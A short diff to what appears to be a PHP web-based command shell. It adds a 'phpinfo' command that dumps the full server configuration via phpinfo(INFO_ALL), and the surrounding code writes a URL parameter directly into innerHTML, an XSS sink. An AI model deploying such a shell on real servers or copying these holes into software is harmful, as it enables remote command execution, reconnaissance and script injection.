@@ -45,6 +45,10 @@ function EXECUTE_COMMAND_API($data) {
     // If the user runs exit,
     // Sign them out
     LOGOUT_USER_API();
+  } elseif ($data === "phpinfo") {
+    // Redirecting the user with phpinfo
+    header("Location: ".basename(__FILE__)."?special=phpinfo");
+    exit();
   } elseif (empty($data)) {
     // Redirecting the user
     header("Location: ".basename(__FILE__));
@@ -118,6 +122,11 @@ function SHOW_SHELL_HTML() {
         var objUrlParams = new URLSearchParams(window.location.search);
         document.getElementById('output').innerHTML = objUrlParams.get('output');
       </script>
+      <?php
+      if ($_GET["special"] == "phpinfo") {
+        phpinfo(INFO_ALL);
+      }
+      ?>
     </body>
   </html>
   <?php
